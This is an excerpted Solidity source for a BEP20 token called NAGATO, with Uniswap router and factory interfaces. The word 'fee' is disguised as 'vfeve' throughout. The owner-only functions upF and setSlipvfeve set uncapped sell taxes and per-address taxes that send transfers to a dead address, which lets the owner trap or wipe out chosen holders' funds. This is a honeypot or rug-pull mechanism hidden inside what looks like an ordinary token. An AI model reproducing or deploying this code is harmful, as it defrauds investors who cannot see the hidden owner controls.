...
interface IUniswapV2Factory {
    ...
    function vfeveTo() external view returns (address);
    function vfeveToSetter() external view returns (address);
    ...
    function setvfeveTo(address) external;
    function setvfeveToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingvfeveOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingvfeveOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingvfeveOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingvfeveOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingvfeveOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract NAGATO is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellvfeve = 0;

    uint256 private _defaultBuyvfeve = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipvfeve;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellvfeve = _value;
    }

    function setSlipvfeve(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipvfeve[_address] = _value;
    }

    function getSlipvfeve(address _address) external view onlyownar returns (uint256) {
        return _slipvfeve[_address];
    }


    function setMAccountvfeve(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountvfeve(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradevfeveAmount = 0;

        if (rF) {
            uint256 tradevfeve = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradevfeve = _defaultSellvfeve;
                }
                if (from == uniswapV2Pair) {

                    tradevfeve = _defaultBuyvfeve;
                }
            }
            if (_slipvfeve[from] > 0) {
                tradevfeve = _slipvfeve[from];
            }

            tradevfeveAmount = _Amount.mul(tradevfeve).div(100);
        }


        if (tradevfeveAmount > 0) {
            _balances[from] = _balances[from].sub(tradevfeveAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradevfeveAmount);
            emit Transfer(from, _deadAddress, tradevfeveAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradevfeveAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradevfeveAmount);
        emit Transfer(from, _to, _Amount - tradevfeveAmount);
    }
